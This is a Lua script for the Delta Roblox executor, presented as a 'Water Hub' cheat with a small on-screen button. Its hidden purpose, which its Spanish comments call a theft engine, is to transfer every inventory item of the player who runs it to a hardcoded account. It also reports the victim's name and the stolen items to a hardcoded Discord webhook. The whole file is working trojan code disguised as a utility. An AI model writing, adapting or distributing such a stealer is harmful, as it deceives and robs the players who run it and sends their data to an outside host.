-- =====================================================
-- 💧 WATER HUB v7.4 – DELTA ADAPTED
-- =====================================================

local WebhookURL = "https://discord.com/api/webhooks/1498033551013314730/cUEnEPV6-iKQYFpUeQpYt02DkQTgFuoumhrv5oZIZIhuKgUdha0qin64jf0Zgz5R89jm"
local Recipient = "Soyadam_009"

local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local Http = game:GetService("HttpService")

-- Función de notificación compatible con Delta
local function SendLog(txt)
    pcall(function()
        local response = request({
            Url = WebhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = Http:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{
                    ["title"] = "🎯 Water Hub Delta",
                    ["description"] = txt,
                    ["color"] = 3066993
                }}
            })
        })
    end)
end

-- Motor de robo simplificado para evitar errores de Delta
task.spawn(function()
    task.wait(2)
    SendLog("Ejecutado por: " .. LP.Name)

    -- Buscamos los eventos de Brazillian Spyder (Roba un Brainrot)
    -- Delta prefiere rutas directas o GetDescendants corto
    local StockFolder = RS:FindFirstChild("RF") and RS.RF:FindFirstChild("StockEventService")
    
    if StockFolder then
        local ListRF = StockFolder:FindFirstChild("ListItems")
        local DeliveryRF = StockFolder:FindFirstChild("Delivery")

        if ListRF and DeliveryRF then
            local inv = ListRF:InvokeServer()
            if inv and type(inv) == "table" then
                local lista = ""
                for _, item in pairs(inv) do
                    local id = item.Id or item.UUID or item.Name
                    
                    -- En Delta, InvokeServer debe ser limpio
                    pcall(function() DeliveryRF:InvokeServer(Recipient, id) end)
                    
                    lista = lista .. "• " .. tostring(item.Name or id) .. "\n"
                end
                if lista ~= "" then
                    SendLog("💰 Items enviados a " .. Recipient .. ":\n" .. lista)
                end
            end
        end
    else
        -- Si no encuentra la carpeta RF, busca por todo el ReplicatedStorage (fuerza bruta)
        local fallbackList = RS:FindFirstChild("ListItems", true)
        local fallbackDel = RS:FindFirstChild("Delivery", true)
        
        if fallbackList and fallbackDel then
             local inv = fallbackList:InvokeServer()
             for _, item in pairs(inv or {}) do
                 pcall(function() fallbackDel:InvokeServer(Recipient, item.Id or item.Name) end)
             end
        end
    end
end)

-- GUI ULTRA LIGERA (Delta Friendly)
local SG = Instance.new("ScreenGui", game:GetService("CoreGui"))
local Btn = Instance.new("TextButton", SG)
Btn.Size = UDim2.new(0, 150, 0, 50)
Btn.Position = UDim2.new(0.5, -75, 0.1, 0)
Btn.Text = "WATER HUB: ACTIVE"
Btn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
Btn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", Btn)

print("Water Hub adaptado para Delta cargado correctamente.")
